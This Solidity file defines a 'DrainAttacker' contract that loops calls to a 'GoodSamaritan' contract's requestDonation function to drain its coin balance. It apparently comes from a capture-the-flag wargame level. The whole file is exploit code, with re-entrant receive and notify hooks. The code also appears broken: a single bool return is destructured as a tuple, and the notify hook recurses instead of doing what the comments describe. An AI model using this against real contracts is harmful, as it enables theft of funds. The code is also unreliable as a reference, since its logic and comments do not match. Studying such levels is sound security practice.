pragma solidity ^0.8.0;
interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function coin() external view returns (address);
    function wallet() external view returns (address);
}
interface ICoin {
    function balanceOf(address) external returns (uint);
}
contract DrainAttacker {
    address instance;
    uint256 public donationsMade;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        // Loop until donation fails (balance is less than 10)
        while (true) {
            (bool success, ) = IGoodSamaritan(instance).requestDonation();
            if (!success) {
                break;
            }
            donationsMade++;
        }

        // After donations, trigger the catch block for final remainder
        IGoodSamaritan(instance).requestDonation();
    }

    receive() external payable {
        attack();
    }

    function notify(uint256) external {
        attack();
    }
}
